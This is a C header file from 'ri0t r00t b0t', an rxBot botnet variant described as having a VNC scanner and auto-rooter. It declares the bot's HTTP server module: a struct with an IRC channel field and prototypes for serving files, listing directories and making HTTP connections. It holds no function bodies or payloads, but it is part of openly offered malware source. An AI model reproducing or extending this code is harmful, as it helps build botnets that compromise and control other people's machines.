/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/

#ifndef NO_HTTPD
typedef struct HTTPD 
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	char file[MAX_PATH];
	char path[MAX_PATH];
	char dir[MAX_PATH];
	unsigned short port;
	int length;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL enabled;
	BOOL type;
	BOOL info;

} HTTPD;

DWORD WINAPI HTTP_Server_Thread(LPVOID param);
int Check_Requested_File(SOCKET sock, char *dir, char *rFile, BOOL dirinfo, int threadnum);
int GetFiles(char *current, SOCKET sock, char *chan, char *URL);
DWORD WINAPI HTTP_Header(LPVOID param);
void HTTP_Send_File(SOCKET sock, char *file);
char *File_To_HTML(char *file);
void HTTP_Connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, unsigned short port, char *method, char *url, char *referer);
#endif